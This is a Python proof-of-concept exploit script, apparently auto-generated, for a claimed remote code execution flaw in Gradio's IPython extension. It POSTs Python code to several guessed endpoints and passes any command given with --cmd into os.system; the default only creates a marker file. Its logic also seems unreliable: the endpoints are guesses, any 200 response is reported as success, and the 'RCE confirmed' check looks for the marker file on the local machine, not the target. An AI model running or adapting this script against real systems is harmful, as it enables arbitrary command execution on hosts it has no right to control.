#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: rce-007
# Sink: blocks
# Auto-generated — run with: python3 rce_python_code_cell_variable_blocks.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in gradio_src (gradio/ipython_ext.py)
Vulnerability: The `blocks` function in gradio/ipython_ext.py calls `exec(cell, None, local_ns)`
              where `cell` is the IPython cell input, fully attacker-controlled.
              No sanitization or validation is performed, allowing arbitrary Python code execution.
Impact: Remote Code Execution (RCE) in the context of the Gradio application.
Usage:   python3 exploit.py --target http://127.0.0.1:7860
         (adjust target URL as needed)
"""

import argparse
import requests
import sys
import time

def exploit(target_url: str, payload: str) -> None:
    """
    Sends a malicious IPython cell to the Gradio blocks endpoint.
    The cell contains arbitrary Python code that will be executed via exec().
    
    Args:
        target_url: Base URL of the Gradio application (e.g., http://127.0.0.1:7860)
        payload:    Python code to execute (should be benign for PoC)
    """
    # The Gradio blocks endpoint typically accepts POST requests with JSON data
    # containing the cell content. The exact endpoint may vary; common patterns:
    # - /api/blocks/ or /blocks/ or /run
    # We'll try a few common endpoints.
    
    endpoints = [
        "/api/blocks/",
        "/blocks/",
        "/run",
        "/api/run",
    ]
    
    # Prepare the malicious cell input
    # The cell is passed as a string in the request body
    # We wrap the payload to ensure it's executed and we can verify success
    # For PoC, we use a benign payload that creates a marker file
    data = {
        "cell": payload
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    for endpoint in endpoints:
        url = target_url.rstrip("/") + endpoint
        print(f"[*] Trying endpoint: {url}")
        try:
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=10
            )
            print(f"[*] Response status: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Success! Payload executed.")
                print(f"[*] Response body (first 500 chars): {response.text[:500]}")
                return
            else:
                print(f"[-] Endpoint returned {response.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout on {url}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] Could not find a working endpoint. The target may not be vulnerable or the URL is wrong.")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in gradio_src (gradio/ipython_ext.py)"
    )
    parser.add_argument(
        "--target",
        default="http://127.0.0.1:7860",
        help="Target Gradio application URL (default: http://127.0.0.1:7860)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()
    
    # Benign payload for PoC: creates a marker file and prints a message
    # The payload is Python code that will be exec'd
    payload = f"""
import os
os.system("{args.cmd}")
print("POC_EXECUTED_SUCCESSFULLY")
"""
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {payload.strip()}")
    print("[*] Attempting exploitation...")
    
    exploit(args.target, payload)
    
    # Verify if the marker file was created (if using default payload)
    if args.cmd == "touch /tmp/poc_success.txt":
        import os.path
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] Marker file /tmp/poc_success.txt exists - RCE confirmed!")
        else:
            print("[-] Marker file not found. Exploit may have failed or target is not vulnerable.")

if __name__ == "__main__":
    main()
